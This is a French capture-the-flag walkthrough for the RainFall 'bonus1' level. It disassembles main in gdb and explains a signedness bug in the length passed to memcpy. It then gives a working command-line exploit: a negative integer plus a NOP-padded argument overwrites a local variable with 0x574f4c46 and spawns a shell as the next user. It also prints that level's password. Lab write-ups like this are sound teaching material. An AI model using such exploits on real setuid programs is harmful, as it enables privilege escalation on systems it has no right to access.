Nous sommes ici en presence d'un binaire bonus1 qui segfault lorsqu'on lui passe moins de 2 arguments
Etudions ce programme de plus pres : 
bonus1@RainFall:~$ gdb -q bonus1
Reading symbols from /home/user/bonus1/bonus1...(no debugging symbols found)...done.
(gdb) info functions
All defined functions:

Non-debugging symbols:
0x080482d4  _init
0x08048320  memcpy
0x08048320  memcpy@plt
0x08048330  __gmon_start__
0x08048330  __gmon_start__@plt
0x08048340  __libc_start_main
0x08048340  __libc_start_main@plt
0x08048350  execl
0x08048350  execl@plt
0x08048360  atoi
0x08048360  atoi@plt
0x08048370  _start
0x080483a0  __do_global_dtors_aux
0x08048400  frame_dummy
0x08048424  main
0x080484b0  __libc_csu_init
0x08048520  __libc_csu_fini
0x08048522  __i686.get_pc_thunk.bx
0x08048530  __do_global_ctors_aux
0x0804855c  _fini
(gdb) info variables
All defined variables:

Non-debugging symbols:
0x08048578  _fp_hw
0x0804857c  _IO_stdin_used
0x08048680  __FRAME_END__
0x08049684  __CTOR_LIST__
0x08049684  __init_array_end
0x08049684  __init_array_start
0x08049688  __CTOR_END__
0x0804968c  __DTOR_LIST__
0x08049690  __DTOR_END__
0x08049694  __JCR_END__
0x08049694  __JCR_LIST__
0x08049698  _DYNAMIC
0x08049764  _GLOBAL_OFFSET_TABLE_
0x08049784  __data_start
0x08049784  data_start
0x08049788  __dso_handle
0x0804978c  completed.6159
0x08049790  dtor_idx.6161
(gdb) disas main
Dump of assembler code for function main:
   0x08048424 <+0>:	push   %ebp
   0x08048425 <+1>:	mov    %esp,%ebp
   0x08048427 <+3>:	and    $0xfffffff0,%esp
   0x0804842a <+6>:	sub    $0x40,%esp
   0x0804842d <+9>:	mov    0xc(%ebp),%eax
   0x08048430 <+12>:	add    $0x4,%eax
   0x08048433 <+15>:	mov    (%eax),%eax
   0x08048435 <+17>:	mov    %eax,(%esp)
   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:	jle    0x804844f <main+43>
   0x08048448 <+36>:	mov    $0x1,%eax
   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
   0x0804844f <+43>:	mov    0x3c(%esp),%eax
   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:	mov    0xc(%ebp),%eax
   0x0804845d <+57>:	add    $0x8,%eax
   0x08048460 <+60>:	mov    (%eax),%eax
   0x08048462 <+62>:	mov    %eax,%edx
   0x08048464 <+64>:	lea    0x14(%esp),%eax
   0x08048468 <+68>:	mov    %ecx,0x8(%esp)
   0x0804846c <+72>:	mov    %edx,0x4(%esp)
   0x08048470 <+76>:	mov    %eax,(%esp)
   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:	jne    0x804849e <main+122>
   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:	movl   $0x8048583,(%esp)
   0x08048499 <+117>:	call   0x8048350 <execl@plt>
   0x0804849e <+122>:	mov    $0x0,%eax
   0x080484a3 <+127>:	leave
   0x080484a4 <+128>:	ret
End of assembler dump.

Nous voyons dans cette fonction un appel a atoi et a memcpy.
Il y a egalement deux 3 jmp differents et un appel a execl a la lgne 117
Essayons d'atteindre cette ligne avec gdb pour voir ce qu'il se passe : 
Le premier jle jump a main+43 si la valeur de retour de atoi (qui prend en arguement le premier arg envoye au binaire) est inferieur ou egale a 9.
Afin de bypass le flags jne nous allons set la valeur de eflags a la valeur suivante : 
(gdb)b*main+42
(gdb)set $eflags=$eflags | 64
(gdb) c
Continuing.
process 3410 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 2: No symbol table is loaded.  Use the "file" command.
$

Nous voyons donc que la commande /bin/dash a bien ete executee. Cependant sur gdb impossible d'avoir le flag ou quelconque droit : 
$ whoami
bonus1
$ cat /home/user/bonus2/.pass
cat: /home/user/bonus2/.pass: Permission denied
$

Comment ne pas jump a l'etape main+92 etant donné que le nombre comparé pour ce jump est celui qui est passe lors du premier jle et doit etre inferieur ou egal a 9 ? On remarque apres plusieurs essai avec differents nombre pour le premier arguement que ce que nous rentrons dans le deuxieme arguement du binaire sera poussee sur la stack en fonction du nombre passe a atoi.
Alors comment faire en sorte que ce nombre aille au dela de 11 tout en n'ayant pas le droit de depasser 9 ? En passant un entier negatif. En effet en passant un int negatif on aura acces a plus d'espace sur la stack. 

Adaptons notre exploit : 
Nous lui passons un int negatif proche de int min pour ne pas aller trop loin, puis nous entrons 40 NOP afin ensuite d'ecraser l'adresse de esp+0x3c par l'int desire soit 0x574f4c46 ce qui nous donne : 

./bonus1 -2147483600 `python -c 'print "\x90" * 40 + "\x46\x4c\x4f\x57"'`
$ whoami
bonus2
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
$
